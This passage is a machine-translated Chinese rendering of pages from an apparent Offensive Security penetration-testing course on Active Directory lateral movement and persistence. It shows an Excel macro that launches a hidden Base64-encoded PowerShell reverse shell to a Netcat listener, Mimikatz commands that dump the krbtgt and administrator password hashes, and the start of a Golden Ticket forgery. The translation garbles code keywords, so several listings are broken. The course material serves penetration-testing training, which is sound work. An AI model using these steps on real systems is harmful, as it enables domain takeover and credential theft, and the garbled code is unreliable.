<div style="position:absolute;top:61766;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">有效载荷大小：324 字节</font></font></nobr></div>
<div style="position:absolute;top:61783;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">hta-psh 文件的最终大小：6461 字节</font></font></nobr></div>
</span></font>
<font size="3" color="#c00000" face="Times"><span style="font-size:11px;font-family:Times;color:#c00000">
<div style="position:absolute;top:61800;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">另存为：evil.hta</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:61819;left:313"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 719 - 使用 msfvenom 创建 HTA 负载 </font></font></i></nobr></div>
</span></font>

<div style="position:absolute;top:61951;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="53"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 53 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:61984;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:63061;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:63061;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:63061;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">670</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:62080;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">请注意，我们使用 Windows 10 客户端的第二个网络接口的 IP 地址，以便</font></font></nobr></div>
<div style="position:absolute;top:62099;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">域控制器可以回调我们的 Netcat 监听器。</font></font></nobr></div>
<div style="position:absolute;top:62132;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">接下来，我们提取以“powershell.exe -nop -w hidden -e”开头的行，然后是 Base64</font></font></nobr></div>
<div style="position:absolute;top:62151;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">编码的有效负载并使用清单 720 中的简单 Python 脚本将命令拆分为更小的</font></font></nobr></div>
<div style="position:absolute;top:62171;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">块，绕过 Excel 宏中文字字符串的大小限制：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:62206;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">str = "powershell.exe -nop -w hidden -e aQBmACgAWwBJAG4AdABQ ....."</font></font></nobr></div>
<div style="position:absolute;top:62239;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">n = 50</font></font></nobr></div>
<div style="position:absolute;top:62273;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">对于范围内的 i (0, len(str), n)：</font></font></nobr></div>
<div style="position:absolute;top:62290;left:141"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">打印 "Str = Str + " + '"' + str[i:i+n] + '"'</font></font></nobr></div>
<div style="position:absolute;top:62310;left:295"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 720 - 拆分 Base64 编码字符串的 Python 脚本</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:62339;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">现在我们将更新我们的 Excel 宏以执行 PowerShell 而不是记事本并重复操作</font></font></nobr></div>
<div style="position:absolute;top:62358;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">将其上传到域控制器并执行。</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:62393;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">子我的宏()</font></font></nobr></div>
<div style="position:absolute;top:62410;left:141"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Dim Str As String</font></font></nobr></div>
<div style="position:absolute;top:62444;left:141"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Str = Str + "powershell.exe -nop -w hidden -e aQBmACgAWwBJAG4Ad"</font></font></nobr></div>
<div style="position:absolute;top:62461;left:141"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Str = Str + "ABQAHQAcgBdADoAOgBTAGkAegBlACAALQBlAHEAIAA0ACKAewA"</font></font></nobr></div>
<div style="position:absolute;top:62478;left:141"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">...</font></font></nobr></div>
<div style="position:absolute;top:62495;left:141"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Str = Str + "EQAaQBhAGcAbgBvAHMAdABpAGMAcwAuAFAAcgBvAGMAZQBzAHM"</font></font></nobr></div>
<div style="position:absolute;top:62512;left:141"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Str = Str + "AXQA6ADoAUwB0AGEAcgB0ACgAJABzACkAOwA="</font></font></nobr></div>
<div style="position:absolute;top:62529;left:141"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">壳牌 (Str)</font></font></nobr></div>
<div style="position:absolute;top:62546;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">结束子</font></font></nobr></div>
<div style="position:absolute;top:62565;left:259"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 721 - 使用拆分的 Base64 编码字符串更新宏</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:62595;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在执行宏之前，我们将在 Windows 10 客户端上启动一个 Netcat 侦听器来接受</font></font></nobr></div>
<div style="position:absolute;top:62614;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">从域控制器反向命令外壳：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:62649;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PS C:\Tools\practical_tools&gt; </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">nc.exe -lvnp 4444</font></font></font></b></nobr></div>
<div style="position:absolute;top:62683;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">听[任何] 4444 ...</font></font></nobr></div>
<div style="position:absolute;top:62700;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">从（未知）[192.168.1.110] 59121 连接到 [192.168.1.111]</font></font></nobr></div>
<div style="position:absolute;top:62717;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Microsoft Windows [版本 10.0.14393]</font></font></nobr></div>
<div style="position:absolute;top:62734;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">(c) 2016 年微软公司。</font><font style="vertical-align: inherit;">版权所有。</font></font></nobr></div>
<div style="position:absolute;top:62768;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">C:\Windows\system32&gt; </font></font></nobr></div>
<div style="position:absolute;top:62787;left:266"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 722 - 来自 DCOM 横向移动技术的反向外壳</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:62816;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">虽然攻击需要访问 DCOM 的 TCP 135 和 SMB 的 TCP 445，但这是一个相对的</font></font></nobr></div>
<div style="position:absolute;top:62836;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">横向移动的新向量，可能会避免一些检测系统，如网络</font></font></nobr></div>
<div style="position:absolute;top:62855;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">入侵检测或基于主机的防病毒软件。</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:16px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:62890;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">21.4.4.1 练习</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:62920;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">1. 重复使用 Excel 和 DCOM 启动记事本的练习。</font></font></nobr></div>
<div style="position:absolute;top:62948;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">2.通过用反向shell连接回的替换VBA宏来改进攻击</font></font></nobr></div>
<div style="position:absolute;top:62967;left:145"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Windows 学生 VM 上的 Netcat。 </font></font></nobr></div>
</span></font>

<div style="position:absolute;top:63139;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="54"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 54 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:63172;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:64249;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:64249;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:64249;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">671</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:63268;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">3. 设置一个从域控制器到你的 Kali 机器的旋转通道并获得一个</font></font></nobr></div>
<div style="position:absolute;top:63287;left:145"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">反向外壳。</font></font></nobr></div>
</span></font>
<font size="4" color="#0070c0" face="Times"><span style="font-size:22px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:63324;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">21.5 Active Directory 持久性</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:63366;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">一旦我们获得访问权限并实现了参与的主要目标，我们的下一个目标是</font></font></nobr></div>
<div style="position:absolute;top:63386;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">获得持久性，确保我们不会失去对受感染机器的访问权限。</font></font></nobr></div>
<div style="position:absolute;top:63418;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们可以在 AD 环境中使用传统的持久化方法，但我们也可以获得 AD 特定的</font></font></nobr></div>
<div style="position:absolute;top:63437;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">坚持也是如此。</font><font style="vertical-align: inherit;">请注意，在许多真实世界的渗透测试或红队参与中，</font></font></nobr></div>
<div style="position:absolute;top:63457;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">持久性不属于范围的一部分，因为一旦评估不完全清除的风险</font></font></nobr></div>
<div style="position:absolute;top:63476;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">已经完成。</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:18px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:63511;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">21.5.1</font></font></i></nobr></div>
<div style="position:absolute;top:63511;left:217"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">黄金门票</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:63549;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">回到 Kerberos 身份验证的解释，我们记得当用户提交一个</font></font></nobr></div>
<div style="position:absolute;top:63568;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">请求一个 TGT，KDC 用一个只有 KDC 知道的密钥加密 TGT</font></font></nobr></div>
<div style="position:absolute;top:63587;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">领域。</font><font style="vertical-align: inherit;">该密钥实际上是名为</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">krbtgt</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">的域用户帐户的密码哈希</font><font style="vertical-align: inherit;">。</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">696</font></font></font></nobr></div>
<div style="position:absolute;top:63620;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">如果我们能够掌握 krbtgt 密码哈希，我们就可以创建自己的自制密码</font></font></nobr></div>
<div style="position:absolute;top:63640;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">自定义 TGT，或</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">金票</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">。</font></font></nobr></div>
<div style="position:absolute;top:63672;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">例如，我们可以创建一个 TGT 声明一个非特权用户实际上是</font></font></nobr></div>
<div style="position:absolute;top:63692;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Domain Admins 组，域控制器将信任它，因为它已正确加密。</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:14px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:63754;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们必须小心保护被盗的 krbtgt 密码哈希，因为它授予</font></font></i></nobr></div>
<div style="position:absolute;top:63773;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">无限制的域访问。</font><font style="vertical-align: inherit;">考虑之前获得客户的许可</font></font></i></nobr></div>
<div style="position:absolute;top:63793;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">执行这项技术。</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:63855;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">这提供了一种在 Active Directory 环境中保持持久性的巧妙方法，但最好的方法是</font></font></nobr></div>
<div style="position:absolute;top:63874;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">优点是krbtgt账户密码不会自动更改。</font></font></nobr></div>
<div style="position:absolute;top:63907;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">实际上，只有在域功能级别从 Windows 升级时才会更改此密码</font></font></nobr></div>
<div style="position:absolute;top:63926;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">2003 到 Windows 2008。因此，找到非常旧的 krbtgt 密码并不少见</font></font></nobr></div>
<div style="position:absolute;top:63945;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">哈希值。</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:14px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:64008;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">域功能级别</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">697</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">规定了</font><font style="vertical-align: inherit;">域的功能</font><font style="vertical-align: inherit;">和</font></font></i></nobr></div>
<div style="position:absolute;top:64027;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">确定哪些 Windows 操作系统可以在域上运行</font></font></i></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:5px;font-family:Times">
<div style="position:absolute;top:64151;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">696 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（微软，2016 年），https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-R2-and-</font></font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:64166;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">2012/dn745899(v=ws.11)#Sec_KRBTGT</font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:5px;font-family:Times">
<div style="position:absolute;top:64185;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">697 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（微软，2017 年），https://docs.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/understanding-</font></font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:64200;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">活动目录域服务-广告-DS-功能级别 </font></font></nobr></div>
</span></font>

<div style="position:absolute;top:64327;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="55"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 55 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:64360;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:65437;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:65437;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:65437;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">672</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:14px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:64456;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">控制器。</font><font style="vertical-align: inherit;">更高的功能级别支持额外的特性、功能和</font></font></i></nobr></div>
<div style="position:absolute;top:64475;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">安全缓解措施。</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:64537;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">为了测试这种持久性技术，我们将首先尝试从 Windows 10 横向移动</font></font></nobr></div>
<div style="position:absolute;top:64557;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">工作站以 Offsec 用户身份通过​​ PsExec 连接到域控制器。</font></font></nobr></div>
<div style="position:absolute;top:64589;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">这应该会失败，因为我们没有适当的权限：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:64624;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">C:\Tools\active_directory&gt; </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">psexec.exe \\dc01 cmd.exe</font></font></font></b></nobr></div>
<div style="position:absolute;top:64658;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PsExec v2.2 - 远程执行进程</font></font></nobr></div>
<div style="position:absolute;top:64675;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 (C) 2001-2016 Mark Russinovich</font></font></nobr></div>
<div style="position:absolute;top:64692;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Sysinternals - www.sysinternals.com</font></font></nobr></div>
<div style="position:absolute;top:64726;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">无法访问 dc01：</font></font></nobr></div>
</span></font>
<font size="3" color="#c00000" face="Times"><span style="font-size:11px;font-family:Times;color:#c00000">
<div style="position:absolute;top:64743;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">访问被拒绝。</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:64762;left:296"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 723 - 尝试执行横向移动失败</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:64792;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在参与的这个阶段，我们应该可以访问一个帐户，该帐户是</font></font></nobr></div>
<div style="position:absolute;top:64811;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">域管理员组或者我们已经破坏了域控制器本身。</font></font></nobr></div>
<div style="position:absolute;top:64844;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">通过这种访问，我们可以使用 Mimikatz 提取 krbtgt 帐户的密码哈希。</font></font></nobr></div>
<div style="position:absolute;top:64877;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">为了模拟这一点，我们将使用 jeff_admin 通过远程桌面登录到域控制器</font></font></nobr></div>
<div style="position:absolute;top:64896;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">帐户，从 C: 文件夹运行 Mimikatz，并发出</font><font style="vertical-align: inherit;">显示</font><font style="vertical-align: inherit;">的</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">lsadump::lsa</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">命令</font></font></nobr></div>
<div style="position:absolute;top:64916;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">以下：</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">698</font></font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:64950;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">mimikatz #</font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">特权::调试</font></font></font></b></nobr></div>
<div style="position:absolute;top:64967;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">权限 '20' OK</font></font></nobr></div>
<div style="position:absolute;top:65001;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">mimikatz # </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">lsadump::lsa /patch</font></font></font></b></nobr></div>
<div style="position:absolute;top:65018;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">域名：CORP / S-1-5-21-1602875587-2787523311-2599479668</font></font></nobr></div>
<div style="position:absolute;top:65052;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">RID : 000001f4 (500)</font></font></nobr></div>
<div style="position:absolute;top:65069;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">用户：管理员</font></font></nobr></div>
<div style="position:absolute;top:65086;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">LM :</font></font></nobr></div>
<div style="position:absolute;top:65103;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">NTLM : e2b475c11da2a0748290d87aa966c327</font></font></nobr></div>
<div style="position:absolute;top:65137;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">RID : 000001f5 (501)</font></font></nobr></div>
<div style="position:absolute;top:65154;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">用户：客人</font></font></nobr></div>
<div style="position:absolute;top:65171;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">LM :</font></font></nobr></div>
<div style="position:absolute;top:65188;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">国家标准：</font></font></nobr></div>
<div style="position:absolute;top:65222;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">RID : 000001f6 (502)</font></font></nobr></div>
<div style="position:absolute;top:65239;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">用户：</font></font><b><font color="#c00000"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">krbtgt</font></font></font></b></nobr></div>
<div style="position:absolute;top:65256;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">LM :</font></font></nobr></div>
<div style="position:absolute;top:65273;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">NTLM : </font></font><b><font color="#c00000"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">75b60230a2394a812000dbfad8415965</font></font></font></b></nobr></div>
<div style="position:absolute;top:65290;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">...</font></font></nobr></div>
<div style="position:absolute;top:65309;left:276"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 724 - 使用 Mimikatz 转储 krbtgt 密码哈希</font></font></i></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:5px;font-family:Times">
<div style="position:absolute;top:65387;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">698 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（本杰明·德尔菲，2016 年），https://github.com/gentilkiwi/mimikatz/wiki/module-~-lsadump</font></font></font></nobr></div>
</span></font>

<div style="position:absolute;top:65515;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="56"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 56 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:65548;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:66625;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:66625;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:66625;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">673</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:65644;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">创建金票并将其注入内存不需要任何管理</font></font></nobr></div>
<div style="position:absolute;top:65663;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">权限，甚至可以从未加入域的计算机执行。</font><font style="vertical-align: inherit;">我们将采取</font></font></nobr></div>
<div style="position:absolute;top:65682;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">散列并从受感染的工作站继续该过程。</font></font></nobr></div>
<div style="position:absolute;top:65715;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在生成黄金票证之前，我们将删除任何现有的 Kerberos 票证</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:13px;font-family:Times">
<div style="position:absolute;top:65735;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kerberos::清除</font></font></b><font style="font-size:14px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">。</font></font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:65768;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们将向</font><font style="vertical-align: inherit;">Mimikatz</font><font style="vertical-align: inherit;">提供域 SID（我们可以使用</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">whoami /user</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">收集</font><font style="vertical-align: inherit;">）</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:13px;font-family:Times">
